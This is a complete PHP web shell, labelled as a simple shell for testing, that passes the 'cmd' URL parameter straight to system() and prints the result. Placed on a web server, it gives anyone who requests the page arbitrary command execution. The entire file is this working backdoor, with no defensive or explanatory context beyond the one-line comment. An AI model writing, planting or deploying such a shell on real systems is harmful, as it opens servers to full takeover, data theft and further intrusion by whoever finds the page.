<?php
// Simple PHP shell for testing
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "PHP Shell: ?cmd=YOUR_COMMAND_HERE";
}
?>
